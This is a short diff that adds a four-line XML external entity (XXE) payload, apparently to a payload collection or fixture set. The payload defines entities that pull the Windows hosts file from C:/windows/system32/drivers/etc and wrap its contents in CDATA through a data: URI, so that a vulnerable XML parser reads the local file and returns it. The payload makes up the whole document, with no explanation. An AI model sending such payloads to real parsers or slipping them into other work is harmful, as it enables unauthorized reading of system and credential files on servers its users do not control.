@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">
+<!ENTITY % wrapped '<!ENTITY exfil SYSTEM "data:text/plain,<root><![CDATA[%file;]]></root>">'>
+%wrapped;
+&exfil;
